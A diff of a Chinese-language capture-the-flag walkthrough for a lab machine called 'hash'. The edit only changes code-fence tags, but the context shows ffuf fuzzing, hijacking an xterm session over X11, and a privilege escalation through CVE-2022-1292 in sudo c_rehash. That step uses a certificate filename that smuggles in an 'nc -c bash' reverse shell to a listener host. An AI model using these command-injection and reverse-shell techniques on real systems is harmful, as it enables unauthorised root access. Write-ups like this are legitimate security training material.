@@ -68,7 +68,7 @@ PORT     STATE SERVICE       VERSION
 
 尝试爆破
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.110/FUZZ.bak -t 50
 ......
@@ -133,7 +133,7 @@ cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
 
 ## User - marco
 
-```shell
+```bash
 ┌─[randark@parrot]─[/tmp]
 └──╼ $nano id_rsa
 ┌─[randark@parrot]─[/tmp]
@@ -155,28 +155,28 @@ marco
 
 ### flag - user
 
-```shell
+```bash
 marco@hash:~$ cat user.txt
 hashmanready
 ```
 
 ### 环境探测
 
-```shell title="ls -lh /home/maria/"
+```bash title="ls -lh /home/maria/"
 total 4.0K
 -rwxr-xr-x 1 maria maria 25 Feb  5  2021 myterm.sh
 ```
 
 查看文件内容
 
-```shell
+```bash
 export DISPLAY=:10
 xterm
 ```
 
 那简单，SSH 可以转发 X11 会话连接，将 SSH 的会话通过 `-XY` 启动 X11 转发，并且在本地启动 X11 会话客户端（例如 `X410`），然后运行这个脚本
 
-```shell
+```bash
 marco@hash:/home/maria$ ./myterm.sh
 ```
 
@@ -190,7 +190,7 @@ marco@hash:/home/maria$ ./myterm.sh
 
 将 `maria` 的 xterm 会话反弹到监听机
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 8888
 [16:19:54] Welcome to pwncat 🐈!
@@ -204,7 +204,7 @@ maria
 
 然后探测环境
 
-```shell title="sudo -l"
+```bash title="sudo -l"
 Matching Defaults entries for maria on hash:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -216,7 +216,7 @@ User maria may run the following commands on hash:
 
 参考：[alcaparra/CVE-2022-1292: CVE-2022-1292 OpenSSL c_rehash Vulnerability - POC](https://github.com/alcaparra/CVE-2022-1292)
 
-```shell
+```bash
 (remote) maria@hash:/home/maria$ nano
 ```
 
@@ -234,13 +234,13 @@ hey.crt`nc -c bash 192.168.56.102 6666
 
 然后执行
 
-```shell
+```bash
 (remote) maria@hash:/home/maria$ sudo /usr/bin/c_rehash .
 ```
 
 ## User - root
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 6666
 [18:56:24] Welcome to pwncat 🐈!
@@ -253,7 +253,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 (remote) root@hash:/root# cat root.txt
 hashhater
 ```
